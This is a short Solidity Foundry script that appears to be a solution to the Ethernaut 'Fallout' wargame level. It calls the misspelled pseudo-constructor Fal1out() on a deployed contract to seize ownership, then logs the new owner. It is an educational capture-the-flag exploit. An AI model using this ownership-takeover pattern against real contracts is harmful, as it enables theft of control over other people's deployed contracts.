//SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import {Script,console} from "forge-std/Script.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutSolution is Script {

  Fallout public fallOut = Fallout(0x902b5Eba04A37ECC299c94Fc346054aB448f499b);

  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    fallOut.Fal1out();
    console.log(fallOut.owner());
    vm.stopBroadcast();
  }
}